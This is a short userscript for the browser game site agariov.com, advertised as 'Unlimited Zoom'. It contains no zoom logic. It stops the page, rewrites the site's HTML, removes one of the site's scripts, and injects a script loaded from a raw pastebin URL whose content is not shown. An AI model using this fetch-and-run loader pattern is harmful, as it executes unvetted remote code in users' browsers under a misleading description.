// ==UserScript==
// @name         agariov.com zoom
// @namespace    agariov.com
// @icon         http://i.imgur.com/m2ZH3pN.png
// @version      1
// @description  Unlimited Zoom Script
// @author       Loger
// @match        http://agariov.com/*
// @include      https://agariov.com/*
// @run-at       document-start
// @grant        GM_xmlhttpRequest
// @connect      agariov.com
// ==/UserScript==
function inject(e) {
    var o = e;
    return o = o.replace("lore22.js", ""), o = o.replace("</body>", x, "</body>");
}
var x = '<script src="//pastebin.com/raw/wPKxR7Ee"></script>';
window.stop();
document.documentElement.innerHTML = null;
GM_xmlhttpRequest({
    method: "GET",
    url: "http://agariov.com/",
    onload: function(e) {
        var o = inject(e.responseText);
        document.open();
        document.write(o);
        document.close();
    }
});